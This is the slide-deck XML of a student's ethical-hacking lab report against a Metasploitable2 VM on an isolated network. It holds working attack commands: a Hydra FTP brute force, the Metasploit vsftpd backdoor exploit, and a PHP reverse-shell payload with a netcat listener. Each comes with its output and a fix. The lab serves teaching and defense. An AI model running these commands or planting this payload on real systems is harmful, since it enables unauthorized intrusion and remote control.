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ELC ETHICAL HACKING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</a:rPr>
              <a:t>Activity Report — 2025-26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Brute Force  |  Remote Shell via Metasploit  |  Web App Reverse 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</a:rPr>
              <a:t>Harshdeep Shantaram Athawale  |  Roll No: 1024031062  |  Batch: 2C74
COE-Experiential Learning | TIET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Overview of activities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</a:rPr>
              <a:t>▸  1.  Lab Setup &amp; Environment (VirtualBox, Metasploitable2)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2.  Reconnaissance — Nmap Port Scanning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3.  Activity 1 — Brute Force Attack using Hydra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4.  Activity 2 — Remote Shell via Metasploit Framework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5.  Activity 3 — Web App Exploitation &amp; PHP Reverse Shell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6.  Results Summary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▸  7.  Security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Lab Setup &amp;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8F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Virtual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</a:rPr>
              <a:t>▸  Hypervisor: VirtualBox 7.2.8</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸  Host OS: Arch Linux</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸  Attacker: 192.168.56.1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  └ Tools: Nmap, Hydra, Metasploit, nc</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸  Victim: Metasploitable2 (Ubuntu 8.04)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  └ IP: 192.168.56.101</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸  Network: Host-only (vboxnet0)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8F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Network Topology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120640" cy="3931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5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FF41"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>  [Arch Linux]
  192.168.56.1
  (Attacker)
       |
  vboxnet0
  Host-only
       |
 [Metasploitable2]
  192.168.56.101
   (Victim VM)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Reconnaissance — Nmap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Identifying open services on the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Command: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FF41"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>$ nmap -sV -p 21,22,80,3306 192.168.56.101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PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.3.4       ← backdoor CVE-2011-2523
22/tcp   open  ssh     OpenSSH 4.7p1
80/tcp   open  http    Apache httpd 2.2.8
3306/tcp open  mysql   MySQL 5.0.51a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</a:rPr>
              <a:t>▸  vsftpd 2.3.4 has a known backdoor — used in Activity 2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1700">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸  Apache serves DVWA — used for Activity 3 (web shell)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1700">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸  FTP service targeted in Activity 1 (brute force)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Activity 1 — Brute Force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Tool: Hydra | Target: FTP (Port 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Command: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FF41"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>$ hydra -l msfadmin -P wordlist.txt ftp://192.168.56.101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Result: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1064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[21][ftp] host: 192.168.56.101   login: msfadmin   password: msfadmin
1 of 1 target successfully completed, 1 valid password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</a:rPr>
              <a:t>▸  Hydra systematically tried all passwords in the wordlist against FTP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Default credential 'msfadmin:msfadmin' was cracked in seconds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Also attempted: SSH (port 22), MySQL (port 3306)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Lesson: Default/weak passwords are trivially broken by automated tools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Fix: Use strong unique passwords + account lockout after N failed attempts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Activity 2 — Remote Shell via Metasploit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CVE-2011-2523 | vsftpd 2.3.4 Backdoor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Commands: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msf6 &gt; use exploit/unix/ftp/vsftpd_234_backdoor
msf6 &gt; set RHOSTS 192.168.56.101
msf6 &gt; set LHOST  192.168.56.1
msf6 &gt;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[*] Started reverse TCP handler on 192.168.56.1:4444
[+] 192.168.56.101:21 - Backdoor has been spawned!
[*] Meterpreter session 1 opened (192.168.56.1:4444 -&gt; 192.168.56.101:42186)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</a:rPr>
              <a:t>▸  vsftpd 2.3.4 contains a hardcoded backdoor triggered by ':)' in username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Metasploit automated the exploit — shell opened in under 3 seconds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Meterpreter provides full remote control: file access, shell, pivoting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Fix: Patch/upgrade vsftpd immediately; use vulnerability scanners regularly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Activity 3 — Web App Reverse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DVWA File Upload → PHP Shell → Netcat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PHP Reverse Shell Payload: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&lt;?php
  $sock = fsockopen('192.168.56.1', 4444);
  proc_open('/bin/sh -i', array(0=&gt;$sock,1=&gt;$sock,2=&gt;$sock), $pipes);
?&gt;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8F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Shell Caught: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234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FF41"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.56.101 39631
sh: no job control in this shell
sh-3.2$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</a:rPr>
              <a:t>▸  DVWA (Security: Low) allows any file type to be uploaded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Uploaded shell.php → triggered via browser → reverse connection to attacker</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸  Fix: Validate file extensions + MIME types; disable PHP execution in upload dirs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5029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17320"/>
            <a:ext cx="2011680" cy="5029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17320"/>
            <a:ext cx="2926080" cy="5029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417320"/>
            <a:ext cx="4206240" cy="5029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2286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Brute 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920240"/>
            <a:ext cx="20116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Hydra 9.7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920240"/>
            <a:ext cx="29260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FTP — Port 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920240"/>
            <a:ext cx="42062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65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msfadmin:msfadmin cracked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2286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88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Remote Shell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74320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788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Metasploit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74320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788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vsftpd 2.3.4 Backdoor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743200"/>
            <a:ext cx="4206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88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Meterpreter session opened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66160"/>
            <a:ext cx="2286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Web App Shell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566160"/>
            <a:ext cx="20116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36118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PHP + Netcat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566160"/>
            <a:ext cx="29260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611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DVWA File Upload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3566160"/>
            <a:ext cx="42062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611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Reverse shell (sh-3.2$)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6FB4"/>
                </a:solidFill>
              </a:rPr>
              <a:t>All 3 activities completed successfully in an isolated lab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Security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</a:rPr>
              <a:t>▸  Use strong, unique passwords — enforce minimum 12 chars + complexity + MFA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Patch software regularly — vsftpd 2.3.4 backdoor known since 2011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Restrict file upload types — whitelist extensions; block PHP in upload dirs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Implement IDS/IPS — detect brute force and unusual connection patterns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Network segmentation — isolate critical services from public-facing ones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Principle of Least Privilege — web server should not run as root</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1800">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸  Regular vulnerability scanning — use tools like Nmap, Nessus, OpenVAS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ELC Ethical Hacking | TIET | 2025-26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 core penetration testing techniques were successfully demonstrated:
Brute Force  •  Remote Shell via Metasploit  •  Web App PHP Reverse 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DFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Key Takeaway: Outdated software, default credentials, and unrestricted file uploads
are among the most exploited vulnerabilities in real-world attacks.
Ethical hacking helps organizations find and fix these before attackers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